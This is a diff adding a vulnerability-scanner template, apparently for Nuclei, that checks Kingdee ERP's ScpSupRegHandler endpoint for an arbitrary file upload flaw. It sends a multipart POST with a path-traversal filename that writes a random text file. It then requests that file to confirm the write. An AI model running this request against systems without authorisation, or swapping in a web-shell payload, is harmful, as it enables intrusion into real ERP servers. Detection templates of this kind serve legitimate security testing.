@@ -1,0 +1,54 @@
+id: kingdee-scpsupreghandler-file-upload
+info:
+  name: 金蝶 ERP scpsupreghandler 接口 - 任意文件上传漏洞
+  author: xiaobaicai
+  severity: high
+  reference:
+    - https://stack.chaitin.com/vuldb/detail/eff4c35e-ee6c-4ef3-aa17-0debe079b983
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-949212
+    vendor: kingdee
+    product: erp
+  tags: file-upload,vuln,kingdee
+variables:
+  s1: '{{rand_int(10000, 99999)}}'
+  s2: '{{to_lower(rand_text_alpha(8))}}'
+  rboundary: '{{to_lower(rand_text_alpha(8))}}'
+flow: http(1) && http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/k3cloud/SRM/ScpSupRegHandler'
+    redirects: false
+    headers:
+      Content-Type: multipart/form-data; boundary={{rboundary}}
+    body: |-
+      --{{rboundary}}
+      Content-Disposition: form-data; name="dbId_v"
+
+      .
+      --{{rboundary}}
+      Content-Disposition: form-data; name="FID"
+
+      2022
+      --{{rboundary}}
+      Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{s2}}.txt"
+      Content-Type: text/plain
+
+      {{s1}}
+
+      --{{rboundary}}--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "true")'
+  - method: GET
+    path:
+      - '{{BaseURL}}/k3cloud/uploadfiles/{{s2}}.txt'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, to_string(s1))'
